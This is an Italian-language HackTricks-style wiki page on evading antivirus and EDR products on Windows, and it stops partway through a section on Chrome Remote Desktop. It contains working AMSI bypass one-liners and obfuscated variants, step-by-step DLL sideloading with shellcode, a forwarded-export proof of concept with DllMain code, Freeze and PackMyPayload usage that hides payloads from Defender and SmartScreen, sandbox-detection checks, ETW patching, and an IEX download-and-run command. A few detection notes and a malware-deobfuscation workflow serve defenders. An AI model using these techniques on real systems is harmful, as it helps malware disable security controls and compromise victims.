# Antivirus (AV) Bypass

{{#include ../banners/hacktricks-training.md}}

**Questa pagina è stata scritta da** [**@m2rc_p**](https://twitter.com/m2rc_p)**!**

## Stop Defender

- [defendnot](https://github.com/es3n1n/defendnot): Uno strumento per fermare Windows Defender dal funzionare.
- [no-defender](https://github.com/es3n1n/no-defender): Uno strumento per fermare Windows Defender dal funzionare fingendo un altro AV.
- [Disable Defender if you are admin](basic-powershell-for-pentesters/README.md)

## **AV Evasion Methodology**

Attualmente, gli AV utilizzano diversi metodi per verificare se un file è maligno o meno: static detection, dynamic analysis e, per gli EDR più avanzati, behavioural analysis.

### **Static detection**

La static detection avviene segnalando stringhe note come malevole o array di byte in un binario o script, e anche estraendo informazioni dal file stesso (es. descrizione del file, nome dell'azienda, firme digitali, icona, checksum, ecc.). Questo significa che usare strumenti pubblici conosciuti può farti rilevare più facilmente, poiché probabilmente sono già stati analizzati e contrassegnati come malevoli. Ci sono un paio di modi per aggirare questo tipo di rilevamento:

- **Encryption**

Se cripta il binario, non ci sarà modo per gli AV di rilevare il tuo programma, ma avrai bisogno di una sorta di loader per decriptare ed eseguire il programma in memoria.

- **Obfuscation**

A volte tutto ciò che devi fare è cambiare alcune stringhe nel tuo binario o script per superare l'AV, ma questo può essere un compito dispendioso in termini di tempo a seconda di cosa stai cercando di offuscare.

- **Custom tooling**

Se sviluppi i tuoi strumenti, non ci saranno firme note negative, ma ciò richiede molto tempo e lavoro.

> [!TIP]
> Un buon modo per verificare la static detection di Windows Defender è [ThreatCheck](https://github.com/rasta-mouse/ThreatCheck). Fondamentalmente divide il file in più segmenti e poi chiede a Defender di scansionare ciascuno individualmente; in questo modo può dirti esattamente quali stringhe o byte sono contrassegnati nel tuo binario.

Ti consiglio vivamente di dare un'occhiata a questa [YouTube playlist](https://www.youtube.com/playlist?list=PLj05gPj8rk_pkb12mDe4PgYZ5qPxhGKGf) sulle tecniche pratiche di AV Evasion.

### **Dynamic analysis**

La dynamic analysis è quando l'AV esegue il tuo binario in una sandbox e osserva attività malevole (es. tentare di decriptare e leggere le password del browser, eseguire un minidump su LSASS, ecc.). Questa parte può essere un po' più complicata con cui lavorare, ma ecco alcune cose che puoi fare per evadere le sandbox.

- **Sleep before execution** A seconda di come è implementato, può essere un ottimo modo per bypassare la dynamic analysis degli AV. Gli AV hanno un tempo molto breve per scansionare i file per non interrompere il flusso di lavoro dell'utente, quindi usare sleep lunghi può disturbare l'analisi dei binari. Il problema è che molte sandbox degli AV possono semplicemente saltare il sleep a seconda dell'implementazione.
- **Checking machine's resources** Di solito le sandbox hanno pochissime risorse a disposizione (es. < 2GB RAM), altrimenti potrebbero rallentare la macchina dell'utente. Puoi anche essere molto creativo qui, ad esempio controllando la temperatura della CPU o anche la velocità delle ventole; non tutto sarà implementato nella sandbox.
- **Machine-specific checks** Se vuoi prendere di mira un utente la cui workstation è joinata al dominio "contoso.local", puoi controllare il dominio del computer per vedere se corrisponde a quello che hai specificato; se non corrisponde, puoi far terminare il tuo programma.

Si scopre che il nome del computer della Sandbox di Microsoft Defender è HAL9TH, quindi puoi controllare il nome del computer nel tuo malware prima della detonazione; se il nome corrisponde a HAL9TH significa che sei dentro la sandbox di Defender, quindi puoi far uscire il tuo programma.

<figure><img src="../images/image (209).png" alt=""><figcaption><p>fonte: <a href="https://youtu.be/StSLxFbVz0M?t=1439">https://youtu.be/StSLxFbVz0M?t=1439</a></p></figcaption></figure>

Altri ottimi consigli da [@mgeeky](https://twitter.com/mariuszbit) per contrastare le Sandboxes

<figure><img src="../images/image (248).png" alt=""><figcaption><p><a href="https://discord.com/servers/red-team-vx-community-1012733841229746240">Red Team VX Discord</a> #malware-dev channel</p></figcaption></figure>

Come detto prima in questo post, gli strumenti pubblici verranno infine rilevati, quindi dovresti chiederti qualcosa:

Per esempio, se vuoi dumpare LSASS, hai davvero bisogno di usare mimikatz? O potresti usare un progetto diverso, meno conosciuto, che faccia comunque il dump di LSASS.

La risposta giusta è probabilmente la seconda. Prendendo mimikatz come esempio, è probabilmente uno dei, se non il più segnalato pezzo di malware dagli AV e dagli EDR; mentre il progetto stesso è molto interessante, è anche un incubo lavorarci per aggirare gli AV, quindi cerca alternative per quello che stai cercando di ottenere.

> [!TIP]
> Quando modifichi i tuoi payload per l'evasione, assicurati di disattivare l'invio automatico dei sample in Defender, e per favore, seriamente, NON CARICARE SU VIRUSTOTAL se il tuo obiettivo è ottenere evasione nel lungo periodo. Se vuoi verificare se il tuo payload viene rilevato da un AV specifico, installalo su una VM, prova a disattivare l'invio automatico dei sample e testalo lì fino a quando non sarai soddisfatto del risultato.

## EXEs vs DLLs

Quando possibile, dai sempre priorità all'uso delle DLL per l'evasione; nella mia esperienza, i file DLL vengono di solito molto meno rilevati e analizzati, quindi è un trucco molto semplice da usare per evitare il rilevamento in alcuni casi (se il tuo payload ha qualche modo di essere eseguito come DLL, ovviamente).

Come si vede in questa immagine, un DLL Payload di Havoc ha un tasso di rilevamento di 4/26 su antiscan.me, mentre il payload EXE ha un tasso di 7/26.

<figure><img src="../images/image (1130).png" alt=""><figcaption><p>antiscan.me comparison of a normal Havoc EXE payload vs a normal Havoc DLL</p></figcaption></figure>

Ora mostreremo alcuni trucchi che puoi usare con i file DLL per essere molto più stealth.

## DLL Sideloading & Proxying

**DLL Sideloading** sfrutta l'ordine di ricerca delle DLL usato dal loader posizionando sia l'applicazione vittima sia il(i) payload maligno(i) uno accanto all'altro.

Puoi cercare programmi suscettibili a DLL Sideloading usando [Siofra](https://github.com/Cybereason/siofra) e il seguente powershell script:
```bash
Get-ChildItem -Path "C:\Program Files\" -Filter *.exe -Recurse -File -Name| ForEach-Object {
$binarytoCheck = "C:\Program Files\" + $_
C:\Users\user\Desktop\Siofra64.exe --mode file-scan --enum-dependency --dll-hijack -f $binarytoCheck
}
```
Questo comando stamperà la lista dei programmi suscettibili a DLL hijacking dentro "C:\Program Files\\" e i file DLL che cercano di caricare.

Ti consiglio vivamente di **explore DLL Hijackable/Sideloadable programs yourself**, questa tecnica è abbastanza stealthy se eseguita correttamente, ma se usi programmi DLL Sideloadable noti pubblicamente, potresti essere facilmente scoperto.

Semplicemente piazzando una DLL malevola con il nome che un programma si aspetta di caricare, non caricherà il tuo payload, poiché il programma si aspetta alcune funzioni specifiche all'interno di quella DLL; per risolvere questo problema, useremo un'altra tecnica chiamata **DLL Proxying/Forwarding**.

**DLL Proxying** inoltra le chiamate che un programma fa dalla DLL proxy (e malevola) alla DLL originale, preservando così la funzionalità del programma e permettendo di gestire l'esecuzione del tuo payload.

Userò il progetto [SharpDLLProxy](https://github.com/Flangvik/SharpDllProxy) di [@flangvik](https://twitter.com/Flangvik/)

Questi sono i passaggi che ho seguito:
```
1. Find an application vulnerable to DLL Sideloading (siofra or using Process Hacker)
2. Generate some shellcode (I used Havoc C2)
3. (Optional) Encode your shellcode using Shikata Ga Nai (https://github.com/EgeBalci/sgn)
4. Use SharpDLLProxy to create the proxy dll (.\SharpDllProxy.exe --dll .\mimeTools.dll --payload .\demon.bin)
```
L'ultimo comando ci fornirà 2 file: un template del codice sorgente della DLL e la DLL originale rinominata.

<figure><img src="../images/sharpdllproxy.gif" alt=""><figcaption></figcaption></figure>
```
5. Create a new visual studio project (C++ DLL), paste the code generated by SharpDLLProxy (Under output_dllname/dllname_pragma.c) and compile. Now you should have a proxy dll which will load the shellcode you've specified and also forward any calls to the original DLL.
```
<figure><img src="../images/dll_sideloading_demo.gif" alt=""><figcaption></figcaption></figure>

Sia il nostro shellcode (codificato con [SGN](https://github.com/EgeBalci/sgn)) sia la proxy DLL hanno un tasso di rilevamento 0/26 su [antiscan.me](https://antiscan.me)! Lo definirei un successo.

<figure><img src="../images/image (193).png" alt=""><figcaption></figcaption></figure>

> [!TIP]
> Ti **consiglio vivamente** di guardare [S3cur3Th1sSh1t's twitch VOD](https://www.twitch.tv/videos/1644171543) su DLL Sideloading e anche [ippsec's video](https://www.youtube.com/watch?v=3eROsG_WNpE) per approfondire quanto abbiamo discusso.

### Abuso dei Forwarded Exports (ForwardSideLoading)

Windows PE modules possono esportare funzioni che sono in realtà "forwarders": invece di puntare a codice, la voce di export contiene una stringa ASCII della forma `TargetDll.TargetFunc`. Quando un chiamante risolve l'export, il loader di Windows farà:

- Carica `TargetDll` se non è già caricato
- Risolve `TargetFunc` da esso

Comportamenti chiave da comprendere:
- Se `TargetDll` è una KnownDLL, viene fornita dallo spazio dei nomi protetto KnownDLLs (e.g., ntdll, kernelbase, ole32).
- Se `TargetDll` non è una KnownDLL, viene usato l'ordine normale di ricerca delle DLL, che include la directory del modulo che effettua la risoluzione del forward.

Questo abilita una primitive di sideloading indiretto: trovare una DLL firmata che esporta una funzione inoltrata a un nome di modulo non-KnownDLL, quindi collocare quella DLL firmata insieme a una DLL controllata dall'attaccante con esattamente lo stesso nome del modulo target inoltrato. Quando l'export inoltrato viene invocato, il loader risolve il forward e carica la tua DLL dalla stessa directory, eseguendo il tuo DllMain.

Esempio osservato su Windows 11:
```
keyiso.dll KeyIsoSetAuditingInterface -> NCRYPTPROV.SetAuditingInterface
```
`NCRYPTPROV.dll` non è una KnownDLL, quindi viene risolta tramite l'ordine di ricerca normale.

PoC (copy-paste):
1) Copia la DLL di sistema firmata in una cartella scrivibile
```
copy C:\Windows\System32\keyiso.dll C:\test\
```
2) Posiziona una `NCRYPTPROV.dll` malevola nella stessa cartella. Un DllMain minimale è sufficiente per ottenere l'esecuzione di codice; non è necessario implementare la funzione forwardata per attivare DllMain.
```c
// x64: x86_64-w64-mingw32-gcc -shared -o NCRYPTPROV.dll ncryptprov.c
#include <windows.h>
BOOL WINAPI DllMain(HINSTANCE hinst, DWORD reason, LPVOID reserved){
if (reason == DLL_PROCESS_ATTACH){
HANDLE h = CreateFileA("C\\\\test\\\\DLLMain_64_DLL_PROCESS_ATTACH.txt", GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
if(h!=INVALID_HANDLE_VALUE){ const char *m = "hello"; DWORD w; WriteFile(h,m,5,&w,NULL); CloseHandle(h);}
}
return TRUE;
}
```
3) Attiva l'inoltro con un LOLBin firmato:
```
rundll32.exe C:\test\keyiso.dll, KeyIsoSetAuditingInterface
```
Comportamento osservato:
- rundll32 (signed) carica la side-by-side `keyiso.dll` (signed)
- Durante la risoluzione di `KeyIsoSetAuditingInterface`, il loader segue il forward verso `NCRYPTPROV.SetAuditingInterface`
- Il loader quindi carica `NCRYPTPROV.dll` da `C:\test` ed esegue il suo `DllMain`
- Se `SetAuditingInterface` non è implementata, otterrai un errore "missing API" solo dopo che `DllMain` è già stato eseguito

Suggerimenti per il rilevamento:
- Concentrati sui forwarded exports dove il modulo target non è un KnownDLL. I KnownDLLs sono elencati sotto `HKLM\SYSTEM\CurrentControlSet\Control\Session Manager\KnownDLLs`.
- Puoi enumerare i forwarded exports con tooling come:
```
dumpbin /exports C:\Windows\System32\keyiso.dll
# forwarders appear with a forwarder string e.g., NCRYPTPROV.SetAuditingInterface
```
- Consulta l'inventario dei forwarder di Windows 11 per cercare candidati: https://hexacorn.com/d/apis_fwd.txt

Detection/defense ideas:
- Monitorare LOLBins (es. rundll32.exe) che caricano DLL firmate da percorsi non di sistema, seguite dal caricamento di non-KnownDLLs con lo stesso nome base da quella directory
- Segnala catene processi/moduli come: `rundll32.exe` → non di sistema `keyiso.dll` → `NCRYPTPROV.dll` in percorsi scrivibili dall'utente
- Applicare policy di integrità del codice (WDAC/AppLocker) e negare write+execute nelle directory delle applicazioni

## [**Freeze**](https://github.com/optiv/Freeze)

`Freeze is a payload toolkit for bypassing EDRs using suspended processes, direct syscalls, and alternative execution methods`

Puoi usare Freeze per caricare ed eseguire il tuo shellcode in modo furtivo.
```
Git clone the Freeze repo and build it (git clone https://github.com/optiv/Freeze.git && cd Freeze && go build Freeze.go)
1. Generate some shellcode, in this case I used Havoc C2.
2. ./Freeze -I demon.bin -encrypt -O demon.exe
3. Profit, no alerts from defender
```
<figure><img src="../images/freeze_demo_hacktricks.gif" alt=""><figcaption></figcaption></figure>

> [!TIP]
> L'evasione è solo un gioco del gatto e del topo: ciò che funziona oggi potrebbe essere rilevato domani, quindi non fare mai affidamento su un solo strumento; se possibile, prova a concatenare più tecniche di evasione.

## AMSI (Anti-Malware Scan Interface)

AMSI è stato creato per prevenire "[fileless malware](https://en.wikipedia.org/wiki/Fileless_malware)". Inizialmente, gli AV erano in grado di scansionare solo **file su disco**, quindi se riuscivi in qualche modo a eseguire payload **direttamente in memoria**, l'AV non poteva fare nulla per impedirlo, poiché non aveva sufficiente visibilità.

La funzionalità AMSI è integrata in questi componenti di Windows.

- User Account Control, or UAC (elevazione di EXE, COM, MSI, o installazione ActiveX)
- PowerShell (script, uso interattivo e valutazione dinamica del codice)
- Windows Script Host (wscript.exe and cscript.exe)
- JavaScript and VBScript
- Office VBA macros

Consente alle soluzioni antivirus di ispezionare il comportamento degli script esponendo il contenuto degli script in una forma non criptata e non offuscata.

L'esecuzione di `IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1')` produrrà il seguente avviso su Windows Defender.

<figure><img src="../images/image (1135).png" alt=""><figcaption></figcaption></figure>

Nota come antepone `amsi:` e poi il percorso dell'eseguibile da cui è avvenuta l'esecuzione dello script, in questo caso, powershell.exe

Non abbiamo scritto alcun file su disco, ma siamo comunque stati rilevati in memoria a causa di AMSI.

Inoltre, a partire da **.NET 4.8**, anche il codice C# viene sottoposto ad AMSI. Questo influisce persino su `Assembly.Load(byte[])` per l'esecuzione in memoria. Per questo motivo si raccomanda di usare versioni .NET inferiori (come la 4.7.2 o precedenti) per l'esecuzione in memoria se si vuole evadere AMSI.

Ci sono un paio di modi per aggirare AMSI:

- **Obfuscation**

Poiché AMSI lavora principalmente con rilevamenti statici, modificare gli script che tenti di caricare può essere un buon modo per evadere la rilevazione.

Tuttavia, AMSI ha la capacità di deoffuscare gli script anche se hanno più livelli, quindi l'obfuscation potrebbe essere una cattiva opzione a seconda di come viene effettuata. Questo rende l'evasione non così immediata. Sebbene a volte tutto ciò che serve sia cambiare qualche nome di variabile e il gioco è fatto, dipende da quanto qualcosa è stato segnalato.

- **AMSI Bypass**

Poiché AMSI è implementato caricando una DLL nel processo di powershell (e anche in quello di cscript.exe, wscript.exe, ecc.), è possibile manometterla facilmente anche eseguendo come utente non privilegiato. A causa di questa falla nell'implementazione di AMSI, i ricercatori hanno trovato diversi modi per eludere la scansione AMSI.

**Forcing an Error**

Forzare il fallimento dell'inizializzazione di AMSI (amsiInitFailed) farà sì che non venga avviata alcuna scansione per il processo corrente. Inizialmente questo è stato divulgato da [Matt Graeber](https://twitter.com/mattifestation) e Microsoft ha sviluppato una signature per prevenirne un uso più diffuso.
```bash
[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
```
È bastata una riga di codice powershell per rendere AMSI inutilizzabile per l'attuale processo powershell. Questa riga è stata ovviamente rilevata dallo stesso AMSI, quindi è necessaria una modifica per poter utilizzare questa tecnica.

Ecco un AMSI bypass modificato che ho preso da questo [Github Gist](https://gist.github.com/r00t-3xp10it/a0c6a368769eec3d3255d4814802b5db).
```bash
Try{#Ams1 bypass technic nº 2
$Xdatabase = 'Utils';$Homedrive = 'si'
$ComponentDeviceId = "N`onP" + "ubl`ic" -join ''
$DiskMgr = 'Syst+@.MÂ£nÂ£g' + 'e@+nt.Auto@' + 'Â£tion.A' -join ''
$fdx = '@ms' + 'Â£InÂ£' + 'tF@Â£' + 'l+d' -Join '';Start-Sleep -Milliseconds 300
$CleanUp = $DiskMgr.Replace('@','m').Replace('Â£','a').Replace('+','e')
$Rawdata = $fdx.Replace('@','a').Replace('Â£','i').Replace('+','e')
$SDcleanup = [Ref].Assembly.GetType(('{0}m{1}{2}' -f $CleanUp,$Homedrive,$Xdatabase))
$Spotfix = $SDcleanup.GetField($Rawdata,"$ComponentDeviceId,Static")
$Spotfix.SetValue($null,$true)
}Catch{Throw $_}
```
Tieni presente che probabilmente questo verrà segnalato una volta che il post sarà pubblicato, quindi non dovresti pubblicare alcun codice se il tuo piano è rimanere non rilevato.

**Memory Patching**

This technique was initially discovered by [@RastaMouse](https://twitter.com/_RastaMouse/) and it involves finding address for the "AmsiScanBuffer" function in amsi.dll (responsible for scanning the user-supplied input) and overwriting it with instructions to return the code for E_INVALIDARG, this way, the result of the actual scan will return 0, which is interpreted as a clean result.

> [!TIP]
> Per una spiegazione più dettagliata, leggi [https://rastamouse.me/memory-patching-amsi-bypass/](https://rastamouse.me/memory-patching-amsi-bypass/).

Ci sono anche molte altre tecniche usate per bypassare AMSI con powershell, vedi [**this page**](basic-powershell-for-pentesters/index.html#amsi-bypass) e [**this repo**](https://github.com/S3cur3Th1sSh1t/Amsi-Bypass-Powershell) per saperne di più.

Questo strumento [**https://github.com/Flangvik/AMSI.fail**](https://github.com/Flangvik/AMSI.fail) genera inoltre script per bypassare AMSI.

**Remove the detected signature**

Puoi usare uno strumento come **[https://github.com/cobbr/PSAmsi](https://github.com/cobbr/PSAmsi)** e **[https://github.com/RythmStick/AMSITrigger](https://github.com/RythmStick/AMSITrigger)** per rimuovere la signature AMSI rilevata dalla memoria del processo corrente. Questo tool funziona scansionando la memoria del processo corrente alla ricerca della AMSI signature e poi sovrascrivendola con istruzioni NOP, rimuovendola effettivamente dalla memoria.

**AV/EDR products that uses AMSI**

Puoi trovare una lista di prodotti AV/EDR che usano AMSI in **[https://github.com/subat0mik/whoamsi](https://github.com/subat0mik/whoamsi)**.

**Use Powershell version 2**
Se usi PowerShell version 2, AMSI non verrà caricato, quindi puoi eseguire i tuoi script senza essere scansionato da AMSI. Puoi fare così:
```bash
powershell.exe -version 2
```
## Registrazione PowerShell

La registrazione di PowerShell è una funzionalità che permette di loggare tutti i comandi PowerShell eseguiti su un sistema. Questo può essere utile per auditing e risoluzione dei problemi, ma può anche rappresentare un **problema per gli attaccanti che vogliono eludere il rilevamento**.

Per bypassare la registrazione di PowerShell, puoi usare le seguenti tecniche:

- **Disable PowerShell Transcription and Module Logging**: Per questo scopo puoi usare uno strumento come [https://github.com/leechristensen/Random/blob/master/CSharp/DisablePSLogging.cs](https://github.com/leechristensen/Random/blob/master/CSharp/DisablePSLogging.cs).
- **Use Powershell version 2**: Se usi PowerShell versione 2, AMSI non verrà caricato, quindi puoi eseguire i tuoi script senza essere scansionati da AMSI. Puoi fare così: `powershell.exe -version 2`
- **Use an Unmanaged Powershell Session**: Usa [https://github.com/leechristensen/UnmanagedPowerShell](https://github.com/leechristensen/UnmanagedPowerShell) per spawnare una sessione powershell senza difese (è quello che usa `powerpick` di Cobal Strike).


## Offuscamento

> [!TIP]
> Diverse tecniche di offuscamento si basano sulla cifratura dei dati, il che aumenta l'entropia del binario e rende più facile agli AV e agli EDR rilevarlo. Fai attenzione e valuta di applicare la cifratura solo a sezioni specifiche del tuo codice che sono sensibili o devono essere nascoste.

### Deoffuscazione di binari .NET protetti da ConfuserEx

Quando si analizza malware che usa ConfuserEx 2 (o fork commerciali) è comune incontrare diversi strati di protezione che bloccheranno i decompilatori e le sandbox. Il flusso di lavoro qui sotto **ripristina in modo affidabile un IL quasi originale** che può successivamente essere decompilato in C# con strumenti come dnSpy o ILSpy.

1.  Rimozione anti-tampering – ConfuserEx cripta ogni *method body* e lo decripta all'interno del costruttore statico del modulo (`<Module>.cctor`). Questo inoltre patcha il checksum del PE quindi qualsiasi modifica farà crashare il binario. Usa **AntiTamperKiller** per individuare le tabelle dei metadata criptate, recuperare le chiavi XOR e riscrivere un assembly pulito:
```bash
# https://github.com/wwh1004/AntiTamperKiller
python AntiTamperKiller.py Confused.exe Confused.clean.exe
```
L'output contiene i 6 parametri anti-tamper (`key0-key3`, `nameHash`, `internKey`) che possono essere utili quando si costruisce il proprio unpacker.

2.  Ripristino di simboli / control-flow – passa il file *clean* a **de4dot-cex** (un fork di de4dot consapevole di ConfuserEx).
```bash
de4dot-cex -p crx Confused.clean.exe -o Confused.de4dot.exe
```
Opzioni:
• `-p crx` – seleziona il profilo ConfuserEx 2
• de4dot annullerà il control-flow flattening, ripristinerà namespace, classi e nomi di variabili originali e decritterà le stringhe costanti.

3.  Rimozione di proxy-call – ConfuserEx sostituisce le chiamate dirette ai metodi con wrapper leggeri (aka *proxy calls*) per rompere ulteriormente la decompilazione. Rimuovili con **ProxyCall-Remover**:
```bash
ProxyCall-Remover.exe Confused.de4dot.exe Confused.fixed.exe
```
Dopo questo passaggio dovresti osservare API .NET normali come `Convert.FromBase64String` o `AES.Create()` invece di funzioni wrapper opache (`Class8.smethod_10`, …).

4.  Pulizia manuale – esegui il binario risultante in dnSpy, cerca grandi blob Base64 o l'uso di `RijndaelManaged`/`TripleDESCryptoServiceProvider` per individuare il payload *reale*. Spesso il malware lo memorizza come un array di byte codificato TLV inizializzato dentro `<Module>.byte_0`.

La catena sopra ripristina il flusso di esecuzione **senza** la necessità di eseguire il campione malevolo – utile quando si lavora su una workstation offline.

🛈  ConfuserEx produce un attributo custom chiamato `ConfusedByAttribute` che può essere usato come IOC per triage automatico dei sample.

#### Comando in una riga
```bash
autotok.sh Confused.exe  # wrapper that performs the 3 steps above sequentially
```
---

- [**InvisibilityCloak**](https://github.com/h4wkst3r/InvisibilityCloak)**: C# obfuscator**
- [**Obfuscator-LLVM**](https://github.com/obfuscator-llvm/obfuscator): Lo scopo di questo progetto è fornire un fork open-source della [LLVM](http://www.llvm.org/) compilation suite in grado di offrire una maggiore sicurezza del software tramite [code obfuscation](<http://en.wikipedia.org/wiki/Obfuscation_(software)>) e protezione contro la manomissione.
- [**ADVobfuscator**](https://github.com/andrivet/ADVobfuscator): ADVobfuscator dimostra come usare il linguaggio `C++11/14` per generare, a compile time, obfuscated code senza usare strumenti esterni e senza modificare il compilatore.
- [**obfy**](https://github.com/fritzone/obfy): Aggiunge un livello di operazioni obfuscated generate dal framework di metaprogrammazione template di C++ che renderà la vita di chi vuole crackare l'applicazione un po' più difficile.
- [**Alcatraz**](https://github.com/weak1337/Alcatraz)**:** Alcatraz è un x64 binary obfuscator in grado di offuscare diversi file PE, inclusi: .exe, .dll, .sys
- [**metame**](https://github.com/a0rtega/metame): Metame è un semplice motore di metamorphic code per eseguibili arbitrari.
- [**ropfuscator**](https://github.com/ropfuscator/ropfuscator): ROPfuscator è un framework di code obfuscation a grana fine per linguaggi supportati da LLVM che utilizza ROP (return-oriented programming). ROPfuscator offusca un programma a livello di codice assembly trasformando istruzioni regolari in catene ROP, ostacolando la nostra concezione naturale del normale flusso di controllo.
- [**Nimcrypt**](https://github.com/icyguider/nimcrypt): Nimcrypt è un .NET PE Crypter scritto in Nim
- [**inceptor**](https://github.com/klezVirus/inceptor)**:** Inceptor è in grado di convertire EXE/DLL esistenti in shellcode e poi caricarli

## SmartScreen & MoTW

Potresti aver visto questa schermata quando scarichi alcuni eseguibili da Internet e li esegui.

Microsoft Defender SmartScreen è un meccanismo di sicurezza pensato per proteggere l'utente finale dall'esecuzione di applicazioni potenzialmente dannose.

<figure><img src="../images/image (664).png" alt=""><figcaption></figcaption></figure>

SmartScreen funziona principalmente con un approccio basato sulla reputazione; ciò significa che applicazioni scaricate raramente attiveranno SmartScreen, avvisando e impedendo all'utente finale di eseguire il file (anche se il file può comunque essere eseguito cliccando More Info -> Run anyway).

**MoTW** (Mark of The Web) è un [NTFS Alternate Data Stream](<https://en.wikipedia.org/wiki/NTFS#Alternate_data_stream_(ADS)>) con il nome Zone.Identifier che viene creato automaticamente al download di file da Internet, insieme all'URL da cui sono stati scaricati.

<figure><img src="../images/image (237).png" alt=""><figcaption><p>Controllo dell'ADS Zone.Identifier per un file scaricato da Internet.</p></figcaption></figure>

> [!TIP]
> È importante notare che gli eseguibili firmati con un certificato di firma **fidato** **non attiveranno SmartScreen**.

Un modo molto efficace per impedire ai tuoi payloads di ottenere il Mark of The Web è confezionarli all'interno di un contenitore, come un ISO. Questo avviene perché Mark-of-the-Web (MOTW) **non può** essere applicato ai volumi **non NTFS**.

<figure><img src="../images/image (640).png" alt=""><figcaption></figcaption></figure>

[**PackMyPayload**](https://github.com/mgeeky/PackMyPayload/) è uno strumento che confeziona payloads in contenitori di output per eludere il Mark-of-the-Web.

Example usage:
```bash
PS C:\Tools\PackMyPayload> python .\PackMyPayload.py .\TotallyLegitApp.exe container.iso

+      o     +              o   +      o     +              o
+             o     +           +             o     +         +
o  +           +        +           o  +           +          o
-_-^-^-^-^-^-^-^-^-^-^-^-^-^-^-^-^-_-_-_-_-_-_-_,------,      o
:: PACK MY PAYLOAD (1.1.0)       -_-_-_-_-_-_-|   /\_/\
for all your container cravings   -_-_-_-_-_-~|__( ^ .^)  +    +
-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-__-_-_-_-_-_-_-''  ''
+      o         o   +       o       +      o         o   +       o
+      o            +      o    ~   Mariusz Banach / mgeeky    o
o      ~     +           ~          <mb [at] binary-offensive.com>
o           +                         o           +           +

[.] Packaging input file to output .iso (iso)...
Burning file onto ISO:
Adding file: /TotallyLegitApp.exe

[+] Generated file written to (size: 3420160): container.iso
```
Here is a demo for bypassing SmartScreen by packaging payloads inside ISO files using [PackMyPayload](https://github.com/mgeeky/PackMyPayload/)

<figure><img src="../images/packmypayload_demo.gif" alt=""><figcaption></figcaption></figure>

## ETW

Event Tracing for Windows (ETW) è un potente meccanismo di logging in Windows che permette ad applicazioni e componenti di sistema di **registrare eventi**. Tuttavia, può anche essere usato dai prodotti di sicurezza per monitorare e rilevare attività malevole.

Simile a come viene disabilitato (bypassed) AMSI, è anche possibile far sì che la funzione user space **`EtwEventWrite`** ritorni immediatamente senza registrare alcun evento. Questo si ottiene patchando la funzione in memoria per farla ritornare immediatamente, disabilitando di fatto il logging ETW per quel processo.

Puoi trovare più informazioni in **[https://blog.xpnsec.com/hiding-your-dotnet-etw/](https://blog.xpnsec.com/hiding-your-dotnet-etw/) and [https://github.com/repnz/etw-providers-docs/](https://github.com/repnz/etw-providers-docs/)**.


## C# Assembly Reflection

Caricare binari C# in memoria è noto da tempo ed è ancora un ottimo modo per eseguire i tuoi strumenti di post-exploitation senza essere rilevato dall'AV.

Poiché il payload verrà caricato direttamente in memoria senza toccare il disco, dovremo preoccuparci solo di patchare AMSI per l'intero processo.

La maggior parte dei framework C2 (sliver, Covenant, metasploit, CobaltStrike, Havoc, etc.) fornisce già la possibilità di eseguire assembly C# direttamente in memoria, ma ci sono diversi modi per farlo:

- **Fork\&Run**

Coinvolge la **creazione di un nuovo processo sacrificial**, l'iniezione del tuo codice malevolo di post-exploitation in quel nuovo processo, l'esecuzione del codice malevolo e, quando finito, la terminazione del nuovo processo. Questo ha sia vantaggi che svantaggi. Il vantaggio del metodo fork and run è che l'esecuzione avviene **fuori** dal processo del nostro Beacon implant. Ciò significa che se qualcosa nella nostra azione di post-exploitation va storto o viene catturato, c'è una **probabilità molto maggiore** che il nostro **implant sopravviva.** Lo svantaggio è che hai una **maggiore probabilità** di essere rilevato da **Behavioural Detections**.

<figure><img src="../images/image (215).png" alt=""><figcaption></figcaption></figure>

- **Inline**

Si tratta di iniettare il codice malevolo di post-exploitation **nel proprio processo**. In questo modo puoi evitare di creare un nuovo processo e farlo scansionare dall'AV, ma lo svantaggio è che se qualcosa va storto con l'esecuzione del payload, c'è una **probabilità molto maggiore** di **perdere il beacon** perché potrebbe andare in crash.

<figure><img src="../images/image (1136).png" alt=""><figcaption></figcaption></figure>

> [!TIP]
> Se vuoi approfondire il caricamento di Assembly C#, dai un'occhiata a questo articolo [https://securityintelligence.com/posts/net-execution-inlineexecute-assembly/](https://securityintelligence.com/posts/net-execution-inlineexecute-assembly/) e al loro InlineExecute-Assembly BOF ([https://github.com/xforcered/InlineExecute-Assembly](https://github.com/xforcered/InlineExecute-Assembly))

Puoi anche caricare C# Assemblies **da PowerShell**, guarda [Invoke-SharpLoader](https://github.com/S3cur3Th1sSh1t/Invoke-SharpLoader) e il video di S3cur3th1sSh1t (https://www.youtube.com/watch?v=oe11Q-3Akuk).

## Using Other Programming Languages

Come proposto in [**https://github.com/deeexcee-io/LOI-Bins**](https://github.com/deeexcee-io/LOI-Bins), è possibile eseguire codice malevolo usando altri linguaggi dando alla macchina compromessa accesso **all'ambiente dell'interprete installato sulla Attacker Controlled SMB share**.

Consentendo l'accesso agli Interpreter Binaries e all'ambiente sulla SMB share puoi **eseguire codice arbitrario in questi linguaggi all'interno della memoria** della macchina compromessa.

Il repo indica: Defender continua a scansionare gli script ma sfruttando Go, Java, PHP ecc. abbiamo **più flessibilità per bypassare firme statiche**. I test con script reverse shell casuali non offuscati in questi linguaggi si sono dimostrati efficaci.

## TokenStomping

Token stomping è una tecnica che permette a un attaccante di **manipolare il token di accesso o un prodotto di sicurezza come un EDR o AV**, consentendo di ridurne i privilegi in modo che il processo non venga terminato ma non abbia i permessi per controllare attività malevole.

Per prevenire questo, Windows potrebbe **impedire ai processi esterni** di ottenere handle sui token dei processi di sicurezza.

- [**https://github.com/pwn1sher/KillDefender/**](https://github.com/pwn1sher/KillDefender/)
- [**https://github.com/MartinIngesen/TokenStomp**](https://github.com/MartinIngesen/TokenStomp)
- [**https://github.com/nick-frischkorn/TokenStripBOF**](https://github.com/nick-frischkorn/TokenStripBOF)

## Using Trusted Software

### Chrome Remote Desktop

Come descritto in [**this blog post**](https://trustedsec.com/blog/abusing-chrome-remote-desktop-on-red-team-operations-a-practical-guide), è facile semplicemente distribuire Chrome Remote Desktop sul PC della vittima e poi usarlo per prenderne il controllo e mantenere la persistenza:
